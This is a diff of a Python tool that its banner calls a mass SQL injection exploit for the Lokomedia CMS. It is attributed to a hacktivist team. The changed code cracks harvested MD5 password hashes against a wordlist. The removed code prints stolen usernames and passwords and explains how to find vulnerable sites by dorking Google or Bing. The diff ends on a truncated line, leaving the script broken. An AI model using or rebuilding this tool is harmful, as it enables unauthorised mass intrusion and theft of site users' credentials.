@@ -64,11 +64,11 @@ try:
         return set(site)
 
     def hash(md5,wrdlst):
-        f = open(wrdlst)
+        f = open(wrdlst,'rb')
         fread = f.readlines()
         f.close()
         for pwd in fread:
-            passw = pwd.replace("\n", "")
+            passw = pwd.decode().replace("\n", "")
             if hashlib.md5(passw.encode()).hexdigest() == md5:
                 return passw
             else:
@@ -139,73 +139,4 @@ try:
 
                         for v in x:
                             try:
-                                uname = v.group(1)
-                                passw = v.group(2)
-                                if "--auto-hash" in sys.argv:
-                                    passw = hash(passw,wrdlst)
-                                print("\t\033[32m%s \033[00m==> \033[32m%s\033[00m" % (uname,passw))
-                            except AttributeError:
-                                pass            
-    def banner():
-        print("""[MASS]         __      __                      __
-   _________ _/ /___  / /______ ___  ___  ____/ /
-  / ___/ __ `/ / __ \/ //_/ __ `__ \/ _ \/ __  / 
- (__  ) /_/ / / /_/ / ,< / / / / / /  __/ /_/ /  
-/____/\__, /_/\____/_/|_/_/ /_/ /_/\___/\__,_/   
-        /_/                    Exploit CMS Lokomedia[SQLi]
- 
-Made with love by Dipkill (Clown Hacktivism Team)
-visit: https://clownhacktivismteam.org
-       https://github.com/Dipkill""")
-        print()
-    def help():
-        banner()
-        print("""usage: ./sqlokmed.py -d [--bing] [--google] [--auto-hash] [--page] [--wordlist]
-ex. ./sqlokmed.py -d inurl:'statis-1-jurnal.html' --bing --auto-hash --page 5 --wordlist darkc0de.txt
-
--h --h --help \t Show help message & exit
--d Dork \t Dork ex. "inurl:statis-1-jurnal.html"
--g --google \t use google dorker(default)
--b --bing \t use bing dorker(choose 1)
---auto-hash \t auto hash password (if found)
---wordlist \t wordlist for hash md5(default darkc0de.txt)
---page \t\t finished parameter start(finished page) in search engine (default 5)
-""")
-        sys.exit()
-
-
-    page = 10
-    tipe = "google"
-    wrdlst = "darkc0de.txt"
-    if "-d" in sys.argv or "--dork" in sys.argv:
-        try:
-            dork = sys.argv[sys.argv.index("-d")+1]
-        except:
-            dork = sys.argv[sys.argv.index("--dork")+1]
-    else:
-        help()                
-    if "-b" in sys.argv or "--bing" in sys.argv:
-        tipe = "bing"                                    
-    if "--page" in sys.argv:
-        page = sys.argv[sys.argv.index("--page")+1]
-    if "--wordlist" in sys.argv:
-        wrdlst = sys.argv[sys.argv.index("--wordlist")+1]    
-    elif "--help" in sys.argv or "-h" in sys.argv or "--h" in sys.argv:
-        help()                                    
-    banner()
-    print("\033[32m[INFO]"+saiki()+"Starting SQLokmed")
-    try:
-        attack(dork, tipe)
-    except KeyboardInterrupt:
-        print()
-        print(saiki+"Shutting down..")
-        sys.exit()                                   
-                          
-                                    
-except KeyboardInterrupt:
-    print()
-    print(saiki+"Shutting down..")
-    sys.exit()                               
-except Exception as e:   
-    print("\033[41m[CCRITICAL]"+saiki()+"Something went wrong, printing the error: " + str(e))
-    pass                      
+                                uname = v
